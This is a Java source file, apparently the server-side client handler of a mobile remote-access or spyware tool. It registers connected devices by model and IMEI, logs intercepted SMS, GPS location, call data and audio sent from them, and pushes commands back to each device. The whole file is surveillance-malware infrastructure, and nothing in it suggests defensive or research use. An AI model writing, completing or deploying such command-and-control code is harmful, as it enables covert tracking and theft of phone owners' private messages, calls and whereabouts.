import java.io.*;
import java.net.Socket;

public class ClientHandler implements Runnable {
    
    private Socket socket;
    private DataInputStream in;
    private DataOutputStream out;
    private ServerGUI gui;
    private String deviceInfo = "Unknown";
    private String imei = "Unknown";
    private String clientIP = "Unknown";

    public ClientHandler(Socket socket, ServerGUI gui) {
        this.socket = socket;
        this.gui = gui;
        this.clientIP = socket.getInetAddress().getHostAddress();
        
        try {
            this.in = new DataInputStream(socket.getInputStream());
            this.out = new DataOutputStream(socket.getOutputStream());
        } catch (IOException e) {
            gui.log("Client handler error: " + e.getMessage());
        }
    }

    @Override
    public void run() {
        try {
            // Receive device info
            String message = in.readUTF();
            if (message.startsWith("INFO:")) {
                String info = message.substring(5);
                String[] parts = info.split("\\|");
                if (parts.length >= 4) {
                    deviceInfo = parts[1] + " (" + parts[2] + ")";
                    imei = parts[3];
                }
            }

            // Listen for commands
            while (true) {
                String command = in.readUTF();
                processResponse(command);
            }
        } catch (EOFException e) {
            gui.log("Client disconnected: " + deviceInfo);
            Server.removeClient(this);
        } catch (IOException e) {
            gui.log("Client error: " + e.getMessage());
            Server.removeClient(this);
        }
    }

    private void processResponse(String response) {
        // Process responses from client
        if (response.startsWith("SMS:")) {
            gui.log("[SMS] " + deviceInfo + ": " + response.substring(4));
        } else if (response.startsWith("GPS:")) {
            gui.log("[GPS] " + deviceInfo + ": " + response.substring(4));
        } else if (response.startsWith("CALL:")) {
            gui.log("[CALL] " + deviceInfo + ": " + response.substring(5));
        } else if (response.startsWith("AUDIO:")) {
            gui.log("[AUDIO] " + deviceInfo + ": " + response.substring(6));
        }
    }

    public void sendCommand(String command) throws IOException {
        out.writeUTF(command);
        out.flush();
    }

    public String getDeviceInfo() {
        return deviceInfo;
    }

    public String getIMEI() {
        return imei;
    }
    
    public String getClientIP() {
        return clientIP;
    }
}
